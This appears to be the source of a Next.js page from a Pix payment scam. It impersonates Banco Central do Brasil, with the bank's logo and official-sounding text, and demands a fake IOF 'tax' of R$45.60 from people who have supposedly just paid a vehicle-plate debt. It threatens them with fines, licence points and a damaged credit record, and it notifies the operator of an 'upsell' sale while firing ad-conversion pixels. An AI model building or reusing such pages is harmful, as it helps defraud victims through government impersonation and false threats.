"use client";

import { useSearchParams, useRouter } from "next/navigation";
import { Suspense, useState, useEffect, useRef } from "react";
import Image from "next/image";
import Script from "next/script";
import { Shield, Volume2 } from "lucide-react";

function IOFContent() {
  const searchParams = useSearchParams();
  const router = useRouter();
  const [isPlaying, setIsPlaying] = useState(false);

  const notificationSent = useRef(false);
  const placa = searchParams.get("placa") || "";
  const valorOriginal = parseFloat(searchParams.get("valor") || "62.70");
  const valorIOF = 45.60;

  useEffect(() => {
    if (!notificationSent.current) {
      notificationSent.current = true;
      fetch("https://api.pushcut.io/EAdPHzz_Giwpjt0AwH9L_/notifications/Venda%20aprovada%20", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: `Pagamento confirmado - Placa: ${placa} - Upsell: IOF` }),
      }).catch(() => {});

      const fireConversion = () => {
        if (typeof window !== "undefined" && (window as any).gtag) {
          // Pixel principal - Liberação paga
          (window as any).gtag("event", "conversion", {
            send_to: "AW-18028225318/FtN3CJa12owcEKbGw5RD",
            value: valorOriginal,
            currency: "BRL",
            transaction_id: `${placa}-liberacao-${Date.now()}`,
          });
          (window as any).gtag("event", "conversion", {
            send_to: "AW-18028092080/fA0TCLnj0o0cELC1u5RD",
            value: valorOriginal,
            currency: "BRL",
            transaction_id: `${placa}-debito-${Date.now()}`,
          });
          (window as any).gtag("event", "conversion", {
            send_to: "AW-17936258767",
            value: valorOriginal,
            currency: "BRL",
          });
          return true;
        }
        return false;
      };

      if (!fireConversion()) {
        const interval = setInterval(() => {
          if (fireConversion()) clearInterval(interval);
        }, 500);
        setTimeout(() => clearInterval(interval), 10000);
      }
    }
  }, [placa, valorOriginal]);

  const handlePagar = () => {
    router.push(`/pix-iof?placa=${placa}&valor=${valorIOF}&valorOriginal=${valorOriginal}`);
  };

  return (
    <div className="flex min-h-screen flex-col bg-white">
      {/* Header com logo Banco Central */}
      <div className="flex items-center justify-center bg-[#1a6b8a] py-6">
        <Image
          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/banco%20central%20logo-oHQZGEwjWx7XfWbJ52l750RwYBMiUY.png"
          alt="Banco Central do Brasil"
          width={180}
          height={100}
          className="h-24 w-auto brightness-0 invert"
        />
      </div>

      {/* Conteúdo principal */}
      <main className="flex flex-1 flex-col p-4">
        {/* Título com barra azul */}
        <div className="mb-4">
          <h1 className="text-xl font-bold text-zinc-900">
            Importante: Pendência junto ao Banco Central
          </h1>
          <div className="mt-2 h-1 w-16 bg-[#4a7fb5]" />
        </div>

        {/* Texto explicativo */}
        <p className="text-sm leading-relaxed text-zinc-700">
          Ao realizar o pagamento da sua pendência com atraso, você estará sujeito à cobrança do Imposto sobre Operações Financeiras (IOF), conforme regulamentação do Banco Central. Este imposto é aplicado para garantir a regularidade da operação e a conformidade com as normas fiscais vigentes.
        </p>

        {/* Card do vídeo */}
        <div className="mt-6 rounded-lg border-l-4 border-[#4a7fb5] bg-zinc-50 p-4">
          <h2 className="text-lg font-bold text-zinc-900">O que é o IOF?</h2>
          
          <div className="mt-2 flex items-center gap-1 text-sm text-zinc-600">
            <span>Aumente o volume</span>
            <Volume2 className="h-4 w-4 text-red-500" />
            <Volume2 className="h-4 w-4 text-red-500" />
            <Volume2 className="h-4 w-4 text-red-500" />
            <Volume2 className="h-4 w-4 text-red-500" />
          </div>

          {/* Vídeo do YouTube */}
          <div className="mt-4 aspect-video w-full overflow-hidden rounded-lg bg-black">
            {!isPlaying ? (
              <button
                type="button"
                onClick={() => setIsPlaying(true)}
                className="flex h-full w-full flex-col items-center justify-center gap-2"
              >
                <div className="flex h-12 w-12 items-center justify-center rounded-full bg-zinc-800">
                  <Volume2 className="h-6 w-6 text-white" />
                </div>
                <span className="text-sm text-white">Clique para Ouvir</span>
              </button>
            ) : (
              <iframe
                width="100%"
                height="100%"
                src="https://www.youtube.com/embed/5r7kM6ZkYb8?autoplay=1"
                title="O que é IOF"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowFullScreen
                className="border-0"
              />
            )}
          </div>
        </div>

        {/* Logo Banco Central centralizado */}
        <div className="my-8 flex justify-center">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/banco%20central%20logo-oHQZGEwjWx7XfWbJ52l750RwYBMiUY.png"
            alt="Banco Central do Brasil"
            width={150}
            height={80}
            className="h-20 w-auto"
          />
        </div>

        {/* Texto de aviso */}
        <p className="text-center text-sm leading-relaxed text-zinc-600">
          O não pagamento do Imposto sobre Operações Financeiras (IOF) resultará no cancelamento da transferência bancária e na aplicação de mais uma multa em seu nome. Além da multa de R$ 195,23 + 5 Pontos na carteira, sua situação poderá ser registrada como inadimplente, impactando negativamente seu histórico financeiro.
        </p>

        {/* Card de pagamento */}
        <div className="mt-6 rounded-xl bg-zinc-100 p-6">
          <div className="flex items-center justify-center gap-2">
            <h3 className="text-lg font-bold text-zinc-900">Pague via Pix</h3>
            <Image
              src="/images/pix-icon.png"
              alt="PIX"
              width={24}
              height={24}
              className="h-6 w-6"
            />
          </div>

          <p className="mt-2 text-center text-sm text-zinc-600">
            O pagamento será confirmado imediatamente
          </p>

          <p className="mt-4 text-center text-3xl font-bold text-green-500">
            R$ {valorIOF.toFixed(2).replace(".", ",")}
          </p>

          <button
            type="button"
            onClick={handlePagar}
            className="mt-4 w-full rounded-full bg-[#4a7fb5] py-4 text-base font-semibold text-white transition-colors hover:bg-[#3a6fa5]"
          >
            Pagar agora
          </button>

          <div className="mt-4 flex items-center justify-center gap-2 text-sm text-zinc-500">
            <Shield className="h-4 w-4 text-green-500" />
            <span>Ambiente seguro</span>
          </div>
        </div>
      </main>
    </div>
  );
}

export default function IOFPage() {
  return (
    <>
      <Script
        src="https://www.googletagmanager.com/gtag/js?id=AW-18028092080"
        strategy="afterInteractive"
      />
      <Script id="gtag-iof-principal" strategy="afterInteractive">
        {`
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'AW-18028092080');
        `}
      </Script>
      <Script
        src="https://www.googletagmanager.com/gtag/js?id=AW-17936258767"
        strategy="afterInteractive"
      />
      <Script id="gtag-iof" strategy="afterInteractive">
        {`
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'AW-17936258767');
        `}
      </Script>
      <Suspense
        fallback={
          <div className="flex min-h-screen items-center justify-center bg-white">
            <p className="text-zinc-600">Carregando...</p>
          </div>
        }
      >
        <IOFContent />
      </Suspense>
    </>
  );
}
